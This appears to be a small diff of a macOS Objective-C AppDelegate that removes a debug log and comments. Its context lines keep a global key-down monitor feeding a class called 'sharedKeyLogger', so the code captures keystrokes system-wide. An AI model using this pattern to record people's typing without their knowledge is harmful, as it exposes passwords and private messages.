@@ -17,9 +17,6 @@
 @implementation AppDelegate
 
 - (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
-//    [Keys sharedKeyLogger];
-    NSLog(@"and here");
-    //Notifications for key presses
     [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
                                            handler:^ (NSEvent *event) {[[Keys sharedKeyLogger] handleKeyPress:event];}];
 }
